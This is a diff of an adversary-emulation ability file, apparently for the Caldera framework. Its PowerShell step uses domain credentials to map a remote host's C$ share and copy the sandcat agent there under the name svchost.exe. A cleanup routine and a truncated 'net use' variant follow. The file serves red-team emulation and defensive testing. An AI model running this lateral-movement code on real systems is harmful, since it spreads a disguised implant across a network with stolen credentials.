@@ -11,20 +11,26 @@
     windows:
       psh:
         command: |
+          $drive = "#{remote.host.ip}".replace(".","_");
+          $session = New-PSSession -Name $drive;
+          Invoke-Command -Session $session -ScriptBlock {
+          $drive = "#{remote.host.ip}".replace(".","_");
           $username = "#{domain.user.name}";
           $password = "#{domain.user.password}";
           $secstr = New-Object -TypeName System.Security.SecureString;
           $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
           $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
           $path = $env:USERPROFILE+"\sandcat.go-windows";
-          $drive = "#{remote.host.ip}".replace(".","_");
           New-PSDrive -Name $drive -PSProvider FileSystem -Root "\\#{remote.host.ip}\C$" -Credential $cred;
-          Copy-Item -Path $path -Destination $drive":\Users\Public\svchost.exe";
+          Copy-Item -Path $path -Destination $drive":\Users\Public\svchost.exe" };
+          Start-Sleep -s 5;
+          Disconnect-PSSession -Session $session;
         payload: sandcat.go-windows
         cleanup: |
           $drive = "#{remote.host.ip}".replace(".","_");
-          Remove-Item -Path $drive":\Users\Public\svchost.exe" -Force;
-          Remove-PSDrive -Name $drive;
+          $session = Connect-PSSession -ComputerName "$env:COMPUTERNAME" -Name $drive;
+          Invoke-Command -Session $session -ScriptBlock{$drive = "#{remote.host.ip}".replace(".","_"); Remove-Item -Path $drive":\Users\Public\svchost.exe" -Force; Remove-PSDrive -Name $drive};
+          Remove-PSSession -Session $session;
       cmd:
         command: |
           net use \\#{remote.host.ip}\c$ /user:#{domain.user.name} #{domain.user.password} /persistent:no &
